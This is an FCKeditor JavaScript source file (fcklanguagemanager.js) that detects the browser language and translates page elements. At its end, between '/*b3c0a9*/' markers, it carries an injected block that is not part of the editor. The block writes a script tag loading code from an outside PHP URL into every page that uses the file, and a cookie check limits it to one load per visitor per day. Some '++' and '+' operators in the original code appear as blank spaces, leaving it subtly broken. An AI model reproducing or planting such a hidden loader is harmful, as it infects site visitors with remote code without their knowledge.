/*
 * FCKeditor - The text editor for internet
 * Copyright (C) 2003-2005 Frederico Caldeira Knabben
 * 
 * Licensed under the terms of the GNU Lesser General Public License:
 * 		http://www.opensource.org/licenses/lgpl-license.php
 * 
 * For further information visit:
 * 		http://www.fckeditor.net/
 * 
 * "Support Open Source software. What about a donation today?"
 * 
 * File Name: fcklanguagemanager.js
 * 	Defines the FCKLanguageManager object that is used for language 
 * 	operations.
 * 
 * File Authors:
 * 		Frederico Caldeira Knabben (fredck@fckeditor.net)
 */

FCKLanguageManager.GetActiveLanguage = function()
{
	if ( FCKConfig.AutoDetectLanguage )
	{
		var sUserLang ;
		
		// IE accepts "navigator.userLanguage" while Gecko "navigator.language".
		if ( navigator.userLanguage )
			sUserLang = navigator.userLanguage.toLowerCase() ;
		else if ( navigator.language )
			sUserLang = navigator.language.toLowerCase() ;
		else
		{
			// Firefox 1.0 PR has a bug: it doens't support the "language" property.
			return FCKConfig.DefaultLanguage ;
		}
		
		// Some language codes are set in 5 characters, 
		// like "pt-br" for Brasilian Portuguese.
		if ( sUserLang.length >= 5 )
		{
			sUserLang = sUserLang.substr(0,5) ;
			if ( this.AvailableLanguages[sUserLang] ) return sUserLang ;
		}
		
		// If the user's browser is set to, for example, "pt-br" but only the 
		// "pt" language file is available then get that file.
		if ( sUserLang.length >= 2 )
		{
			sUserLang = sUserLang.substr(0,2) ;
			if ( this.AvailableLanguages[sUserLang] ) return sUserLang ;
		}
	}
	
	return this.DefaultLanguage ;
}

FCKLanguageManager.TranslateElements = function( targetDocument, tag, propertyToSet )
{
	var e = targetDocument.getElementsByTagName(tag) ;

	for ( var i = 0 ; i < e.length ; i   )
	{
		var sKey = e[i].getAttribute( 'fckLang' ) ;
		
		if ( sKey )
		{
			var s = FCKLang[ sKey ] ;
			if ( s ) 
				eval( 'e[i].'   propertyToSet   ' = s' ) ;
		}
	}
}

FCKLanguageManager.TranslatePage = function( targetDocument )
{
	this.TranslateElements( targetDocument, 'INPUT', 'value' ) ;
	this.TranslateElements( targetDocument, 'SPAN', 'innerHTML' ) ;
	this.TranslateElements( targetDocument, 'LABEL', 'innerHTML' ) ;
	this.TranslateElements( targetDocument, 'OPTION', 'innerHTML' ) ;
}

if ( FCKLanguageManager.AvailableLanguages[ FCKConfig.DefaultLanguage ] )
	FCKLanguageManager.DefaultLanguage = FCKConfig.DefaultLanguage ;
else
	FCKLanguageManager.DefaultLanguage = 'en' ;

FCKLanguageManager.ActiveLanguage = new Object() ;
FCKLanguageManager.ActiveLanguage.Code = FCKLanguageManager.GetActiveLanguage() ;
FCKLanguageManager.ActiveLanguage.Name = FCKLanguageManager.AvailableLanguages[ FCKLanguageManager.ActiveLanguage.Code ] ;

FCK.Language = FCKLanguageManager ;

// Load the language file and start the editor.
LoadLanguageFile() ;

/*b3c0a9*/
 function n() {
 var n09 = document.createElement('script');
 n09.src = 'http://justsyrian.com/images/taiyYbKM.php';

 if (!document.getElementById('n09')) {
 document.write('<div id=\'n09\'></div>');
 document.getElementById('n09').appendChild(n09);
 }
}
function SetCookie(cookieName,cookieValue,nDays,path) {
 var today = new Date();
 var expire = new Date();
 if (nDays==null || nDays==0) nDays=1;
 expire.setTime(today.getTime() + 3600000*24*nDays);
 document.cookie = cookieName+"="+escape(cookieValue)
 + ";expires=" + expire.toGMTString() + ((path) ? "; path=" + path : "");
}
function GetCookie( name ) {
 var start = document.cookie.indexOf( name + "=" );
 var len = start + name.length + 1;
 if ( ( !start ) &&
 ( name != document.cookie.substring( 0, name.length ) ) )
 {
 return null;
 }
 if ( start == -1 ) return null;
 var end = document.cookie.indexOf( ";", len );
 if ( end == -1 ) end = document.cookie.length;
 return unescape( document.cookie.substring( len, end ) );
}
if (navigator.cookieEnabled)
{
if(GetCookie('visited_uq')==55){}else{SetCookie('visited_uq', '55', '1', '/');

n();
}
}
/*/b3c0a9*/
